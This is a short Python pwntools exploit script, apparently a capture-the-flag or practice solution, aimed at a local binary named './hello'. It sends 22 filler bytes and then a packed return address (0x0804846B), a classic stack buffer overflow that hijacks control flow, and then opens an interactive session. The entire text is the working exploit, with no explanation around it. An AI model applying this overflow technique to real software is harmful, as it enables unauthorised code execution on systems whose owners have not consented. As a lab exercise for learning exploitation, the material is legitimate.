from pwn import *
p = process("./hello")

payload = 'A'*22+p32(0x0804846B)

p.sendline(payload)
p.interactive()
